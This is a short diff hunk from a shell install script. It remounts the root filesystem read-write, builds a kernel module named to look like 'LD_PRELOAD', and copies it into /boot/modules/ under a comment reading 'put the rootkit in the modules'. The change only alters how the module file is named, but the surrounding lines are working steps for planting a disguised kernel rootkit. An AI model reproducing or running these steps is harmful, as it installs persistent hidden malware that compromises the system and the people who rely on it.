@@ -10,8 +10,8 @@ mount -o rw /
 
 make
 
-mv LD_PRELOAD.ko LD_PRELOAD
-LKM_NAME="LD_PRELOAD"
+# mv LD_PRELOAD.ko LD_PRELOAD
+LKM_NAME="LD_PRELOAD.ko"
 
 # put the rootkit in the modules
 cp "$LKM_NAME" /boot/modules/
